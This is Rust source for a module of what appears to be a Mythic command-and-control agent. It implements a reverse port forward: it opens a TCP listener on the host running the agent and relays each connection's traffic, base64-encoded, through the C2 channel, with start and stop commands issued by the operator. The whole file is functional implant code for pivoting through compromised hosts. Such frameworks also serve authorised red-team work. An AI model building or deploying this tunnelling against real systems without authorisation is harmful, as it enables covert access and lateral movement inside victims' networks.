use crate::structs::{SocksMsg, Task};
use crate::utils;
use base64::{engine::general_purpose::STANDARD as BASE64, Engine};
use serde::Deserialize;
use std::collections::HashMap;
use std::sync::Arc;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpListener;
use tokio::sync::{mpsc, Mutex};
use tokio::time::Duration;

const READ_BUF_SIZE: usize = 4096;
const CONN_CHANNEL_SIZE: usize = 200;

#[derive(Deserialize)]
struct RpfwdArgs {
    action: String,
    #[serde(default)]
    port: u16,
    #[serde(default)]
    remote_ip: String,
    #[serde(default)]
    remote_port: u16,
}

/// Per-connection channel sender and the port it belongs to.
struct ConnEntry {
    tx: mpsc::Sender<SocksMsg>,
    port: u16,
}

/// Shared state for all active RPFWD connections and listeners.
struct RpfwdManager {
    /// server_id -> per-connection sender + port
    connections: Mutex<HashMap<u32, ConnEntry>>,
    /// port -> shutdown signal sender (drop to stop listener)
    listeners: Mutex<HashMap<u16, mpsc::Sender<()>>>,
    /// Channel to send outbound rpfwd messages back to Mythic
    to_mythic_tx: mpsc::Sender<SocksMsg>,
}

impl RpfwdManager {
    fn new(to_mythic_tx: mpsc::Sender<SocksMsg>) -> Self {
        Self {
            connections: Mutex::new(HashMap::new()),
            listeners: Mutex::new(HashMap::new()),
            to_mythic_tx,
        }
    }

    /// Close all connections for a specific port.
    async fn close_connections_for_port(&self, port: u16) {
        let mut conns = self.connections.lock().await;
        let to_remove: Vec<u32> = conns
            .iter()
            .filter(|(_, entry)| entry.port == port)
            .map(|(id, _)| *id)
            .collect();
        for id in &to_remove {
            conns.remove(id);
        }
        if !to_remove.is_empty() {
            utils::print_debug(&format!(
                "RPFWD: closed {} connections for port {}",
                to_remove.len(),
                port
            ));
        }
    }

    /// Remove a single connection by server_id.
    async fn remove(&self, server_id: u32) {
        self.connections.lock().await.remove(&server_id);
    }

    /// Send data back to Mythic for a given connection.
    async fn send_data(&self, server_id: u32, data: &[u8], port: u16) {
        let _ = self
            .to_mythic_tx
            .send(SocksMsg {
                server_id,
                data: BASE64.encode(data),
                exit: false,
                port: port as u32,
            })
            .await;
    }

    /// Send an exit message to Mythic for a given connection.
    async fn send_exit(&self, server_id: u32, port: u16) {
        let _ = self
            .to_mythic_tx
            .send(SocksMsg {
                server_id,
                data: String::new(),
                exit: true,
                port: port as u32,
            })
            .await;
    }
}

// ============================================================================
// Initialization — called once at agent startup
// ============================================================================

/// Lazily stored manager so the command handler can start/stop listeners.
static MANAGER: std::sync::OnceLock<Arc<RpfwdManager>> = std::sync::OnceLock::new();

/// Start the background RPFWD message dispatcher.
/// `from_mythic_rx` receives rpfwd messages routed from Mythic.
/// `to_mythic_tx` sends rpfwd messages back towards Mythic.
pub fn initialize(
    from_mythic_rx: mpsc::Receiver<SocksMsg>,
    to_mythic_tx: mpsc::Sender<SocksMsg>,
) {
    let manager = Arc::new(RpfwdManager::new(to_mythic_tx));
    let _ = MANAGER.set(manager.clone());

    // Spawn dispatch loop for incoming rpfwd messages from Mythic
    tokio::spawn(dispatch_loop(from_mythic_rx, manager));
}

/// Route incoming rpfwd messages from Mythic to the correct local connection.
async fn dispatch_loop(
    mut from_mythic_rx: mpsc::Receiver<SocksMsg>,
    manager: Arc<RpfwdManager>,
) {
    while let Some(msg) = from_mythic_rx.recv().await {
        let server_id = msg.server_id;

        // Clone the sender under the lock, then release before sending.
        // This prevents contention with handle_connection registering new connections.
        let tx = {
            let conns = manager.connections.lock().await;
            conns.get(&server_id).map(|entry| entry.tx.clone())
        };

        if let Some(tx) = tx {
            if tx.try_send(msg).is_err() {
                utils::print_debug(&format!(
                    "RPFWD: dropping msg for server_id={}, channel full/closed",
                    server_id
                ));
            }
        }
        // Unknown server_id messages are silently dropped
    }
}

// ============================================================================
// Listener management
// ============================================================================

/// Start a TCP listener on the given port. Each incoming connection gets a
/// random server_id and bidirectional relay through Mythic.
async fn start_listener(port: u16, manager: Arc<RpfwdManager>) -> Result<(), String> {
    let addr = format!("0.0.0.0:{}", port);
    let listener = TcpListener::bind(&addr)
        .await
        .map_err(|e| format!("Failed to bind {}: {}", addr, e))?;

    utils::print_debug(&format!("RPFWD: listening on {}", addr));

    // Create shutdown channel
    let (shutdown_tx, mut shutdown_rx) = mpsc::channel::<()>(1);
    manager
        .listeners
        .lock()
        .await
        .insert(port, shutdown_tx);

    let mgr = manager.clone();
    tokio::spawn(async move {
        loop {
            tokio::select! {
                accept_result = listener.accept() => {
                    match accept_result {
                        Ok((stream, peer_addr)) => {
                            utils::print_debug(&format!(
                                "RPFWD: new connection on port {} from {}",
                                port, peer_addr
                            ));
                            let server_id = rand::random::<u32>() & 0x7FFFFFFF;
                            // Spawn connection handler so accept loop isn't blocked
                            let m = mgr.clone();
                            tokio::spawn(async move {
                                handle_connection(server_id, stream, port, m).await;
                            });
                        }
                        Err(e) => {
                            utils::print_debug(&format!(
                                "RPFWD: accept error on port {}: {}",
                                port, e
                            ));
                            break;
                        }
                    }
                }
                _ = shutdown_rx.recv() => {
                    utils::print_debug(&format!("RPFWD: shutting down listener on port {}", port));
                    break;
                }
            }
        }
        // Clean up all connections for this port
        mgr.close_connections_for_port(port).await;
        mgr.listeners.lock().await.remove(&port);
    });

    Ok(())
}

/// Set up bidirectional relay for a single accepted connection.
async fn handle_connection(
    server_id: u32,
    stream: tokio::net::TcpStream,
    port: u16,
    manager: Arc<RpfwdManager>,
) {
    let _ = stream.set_nodelay(true);
    let (read_half, write_half) = stream.into_split();

    // Create channel for Mythic → local direction
    let (conn_tx, conn_rx) = mpsc::channel::<SocksMsg>(CONN_CHANNEL_SIZE);

    // Register this connection
    manager
        .connections
        .lock()
        .await
        .insert(server_id, ConnEntry { tx: conn_tx, port });

    // Spawn reader: local → Mythic
    let mgr_r = manager.clone();
    tokio::spawn(async move {
        read_from_local(read_half, server_id, port, mgr_r).await;
    });

    // Spawn writer: Mythic → local
    let mgr_w = manager.clone();
    tokio::spawn(async move {
        write_to_local(conn_rx, write_half, server_id, port, mgr_w).await;
    });
}

// ============================================================================
// Bidirectional relay tasks
// ============================================================================

/// Read data from the local connection and send it to Mythic.
async fn read_from_local(
    mut read_half: tokio::net::tcp::OwnedReadHalf,
    server_id: u32,
    port: u16,
    manager: Arc<RpfwdManager>,
) {
    let mut buf = vec![0u8; READ_BUF_SIZE];
    loop {
        match read_half.read(&mut buf).await {
            Ok(0) => {
                manager.send_exit(server_id, port).await;
                manager.remove(server_id).await;
                return;
            }
            Ok(n) => {
                manager.send_data(server_id, &buf[..n], port).await;
            }
            Err(_) => {
                manager.send_exit(server_id, port).await;
                manager.remove(server_id).await;
                return;
            }
        }
    }
}

/// Read data from Mythic (via channel) and write it to the local connection.
async fn write_to_local(
    mut from_mythic: mpsc::Receiver<SocksMsg>,
    mut write_half: tokio::net::tcp::OwnedWriteHalf,
    server_id: u32,
    port: u16,
    manager: Arc<RpfwdManager>,
) {
    while let Some(msg) = from_mythic.recv().await {
        if msg.exit {
            manager.remove(server_id).await;
            return;
        }

        if msg.data.is_empty() {
            continue;
        }

        let data = match BASE64.decode(&msg.data) {
            Ok(d) => d,
            Err(_) => {
                manager.send_exit(server_id, port).await;
                manager.remove(server_id).await;
                return;
            }
        };

        if write_half.write_all(&data).await.is_err() {
            manager.send_exit(server_id, port).await;
            manager.remove(server_id).await;
            return;
        }
    }
    // Channel closed — connection removed elsewhere
}

// ============================================================================
// Command handler (called by task dispatcher)
// ============================================================================

pub async fn execute(task: Task) {
    let mut response = task.new_response();
    let args: RpfwdArgs = match serde_json::from_str(&task.data.params) {
        Ok(a) => a,
        Err(e) => {
            response.set_error(&format!("Failed to parse: {}", e));
            let _ = task.job.send_responses.send(response).await;
            let _ = task
                .remove_running_task
                .send(task.data.task_id.clone())
                .await;
            return;
        }
    };

    let manager = match MANAGER.get() {
        Some(m) => m.clone(),
        None => {
            response.set_error("RPFWD not initialized");
            let _ = task.job.send_responses.send(response).await;
            let _ = task
                .remove_running_task
                .send(task.data.task_id.clone())
                .await;
            return;
        }
    };

    match args.action.as_str() {
        "start" => {
            // Close any existing connections on this port first
            manager.close_connections_for_port(args.port).await;

            // Stop existing listener on this port if any
            {
                let mut listeners = manager.listeners.lock().await;
                if let Some(shutdown_tx) = listeners.remove(&args.port) {
                    let _ = shutdown_tx.send(()).await;
                    // Give it a moment to clean up
                    tokio::time::sleep(Duration::from_millis(100)).await;
                }
            }

            match start_listener(args.port, manager).await {
                Ok(()) => {
                    response.user_output = format!(
                        "reverse port forward started on port: {}\n",
                        args.port
                    );
                    response.completed = true;
                }
                Err(e) => {
                    response.set_error(&e);
                }
            }
        }
        "stop" => {
            // Close connections first
            manager.close_connections_for_port(args.port).await;

            // Stop the listener
            let mut listeners = manager.listeners.lock().await;
            if let Some(shutdown_tx) = listeners.remove(&args.port) {
                let _ = shutdown_tx.send(()).await;
                response.user_output = format!(
                    "reverse port forward stopped on port: {}\n",
                    args.port
                );
            } else {
                response.user_output = format!(
                    "reverse port forward wasn't listening on port: {}\n",
                    args.port
                );
            }
            response.completed = true;
        }
        _ => response.set_error(&format!("Unknown action: {}", args.action)),
    }

    let _ = task.job.send_responses.send(response).await;
    let _ = task
        .remove_running_task
        .send(task.data.task_id.clone())
        .await;
}
